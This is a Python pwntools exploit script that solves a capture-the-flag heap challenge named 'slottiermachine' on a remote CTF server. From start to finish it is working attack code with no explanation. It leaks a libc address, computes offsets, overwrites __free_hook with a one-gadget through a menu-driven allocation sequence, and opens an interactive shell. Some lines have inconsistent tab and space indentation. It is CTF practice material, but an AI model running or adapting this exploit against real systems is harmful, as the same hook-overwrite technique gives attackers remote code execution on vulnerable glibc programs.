#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *

LOCAL = False

def pwn():
	
	log.info("slottiermachine - pwnuniversity - mphx2\n\n")
	
	system = target.recvuntil("[ 4 ] : bye!\n")
	system = int(system[139:154],0)
	
	libc_base = system - 0x45380
	magic_gadget = libc_base + 0xe75f0 #0x45200
	free_hook = libc_base + 0x1c0748

	log.success("libc base    addr: %#x", libc_base)
	log.success("__free_hook  addr: %#x", free_hook)
  	log.success("magic gadget addr: %#x", magic_gadget) 
	
#	raw_input()

	target.sendline("1")
	target.recvuntil("How much?\n")
	target.sendline("128")
	
	target.recvuntil("[ 4 ] : bye!\n")
	target.sendline("2")
	target.recvuntil("Where?\n")
	target.sendline("0")

	target.recvuntil("[ 4 ] : bye!\n")
	target.sendline("3")
	target.recvuntil("What?\n")
	target.sendline(p64(free_hook))
	
	target.recvuntil("[ 4 ] : bye!\n")
	target.sendline("1")
  	target.recvuntil("How much?\n")
 	 target.sendline("128")

	target.recvuntil("[ 4 ] : bye!\n")
  	target.sendline("1")
  	target.recvuntil("How much?\n")
 	target.sendline("128")

	target.recvuntil("[ 4 ] : bye!\n")
  	target.sendline("3")
  	target.recvuntil("What?\n")
  	target.sendline(p64(magic_gadget))

#	raw_input()

	target.recvuntil("[ 4 ] : bye!\n")
  	target.sendline("2")
  	target.recvuntil("Where?\n")
  	target.sendline("1")

	target.interactive()

def main():
        global target
        if LOCAL:
                target = process("./slottiermachine")
        else:
                target = remote("slottiermachine.uni.hctf.fun", 13371)
        pwn()

if __name__ == "__main__":
    main()

